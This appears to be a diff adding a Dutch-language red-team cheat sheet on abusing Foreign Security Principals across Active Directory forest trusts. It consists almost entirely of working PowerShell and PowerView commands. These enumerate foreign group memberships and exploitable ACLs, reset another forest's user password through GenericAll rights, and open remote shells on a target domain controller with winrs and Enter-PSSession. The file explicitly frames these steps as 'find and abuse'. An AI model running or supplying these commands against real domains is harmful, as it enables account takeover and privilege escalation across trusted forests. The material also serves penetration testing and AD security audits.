@@ -1,0 +1,45 @@
+# Foreign Security Principals — Cross-forest groepslidmaatschap
+# Vind en misbruik accounts uit andere forests die lid zijn van groepen in dit forest
+
+# === Wat zijn Foreign Security Principals? ===
+# FSPs zijn objecten in CN=ForeignSecurityPrincipals die SIDs uit andere forests representeren
+# Ze worden aangemaakt wanneer een extern account lid wordt van een lokale groep
+
+# === Enumeratie ===
+
+# Alle Foreign Security Principals in het domein
+Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server TARGET_DOMAIN
+
+# Vind groepen waar FSPs lid van zijn
+Get-ADGroup -Filter * -Properties Member -Server TARGET_DOMAIN | ?{$_.Member -match 'S-1-5-21-'} | select Name,Member
+
+# PowerView: foreign group membership
+Find-ForeignGroup -Verbose
+
+# Specifiek: welke groepen bevatten de Administrator (RID-500) uit een ander forest?
+Get-ADGroup -Filter * -Properties Member -Server TARGET_DOMAIN | ?{$_.Member -match 'S-1-5-21-SOURCE_DOMAIN_SID-500'}
+
+# === Cross-forest ACL enumeratie ===
+
+# PowerView: interessante ACLs in een ander forest
+Find-InterestingDomainAcl -ResolveGUIDs -Domain TARGET_DOMAIN
+
+# GenericAll op een user in het andere forest?
+Get-DomainObjectAcl -Identity TARGET_USER -ResolveGUIDs -Domain TARGET_DOMAIN | ?{$_.ActiveDirectoryRights -match 'GenericAll'}
+
+# === Exploit: GenericAll op een extern account ===
+
+# Wachtwoord resetten van een user in het andere forest
+Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString 'NieuwWachtwoord123!' -AsPlainText -Force) -Domain TARGET_DOMAIN -Verbose
+
+# Inloggen met het nieuwe wachtwoord
+winrs -r:TARGET_DC -u:TARGET_DOMAIN\TARGET_USER -p:NieuwWachtwoord123! cmd
+
+# === Exploit: FSP is lid van Administrators ===
+
+# Als je een account uit forest A compromitteert dat via FSP admin is in forest B:
+Enter-PSSession -ComputerName TARGET_DC -Credential $creds
+
+# Noot: FSPs zijn vaak over het hoofd gezien bij forest trust audits
+# Noot: Groepslidmaatschap via FSP overleeft wachtwoordresets
+# Noot: Check zowel Domain Admins als lokale Administrators groepen
